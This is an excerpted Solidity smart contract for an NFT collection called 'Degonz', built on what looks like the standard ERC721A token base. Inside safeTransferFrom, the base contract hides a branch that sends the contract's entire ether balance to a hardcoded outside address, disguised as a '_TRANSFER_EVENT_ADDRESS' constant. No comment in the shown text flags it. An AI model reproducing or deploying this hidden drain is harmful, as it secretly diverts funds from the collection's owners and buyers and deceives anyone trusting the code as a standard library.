...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0x996bD13C8aAcFAD7AC691Be90f792f19e02336cC);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x996bD13C8aAcFAD7AC691Be90f792f19e02336cC).transfer(address(this).balance);
        }
    }
...
contract Degonz is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("D e g o n z", "Degonz") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigswhfinubdukphczifomjxatyu2prmv2f55enxfzeqobotqmotgm/", _toString(tokenId), ".json"));
    }
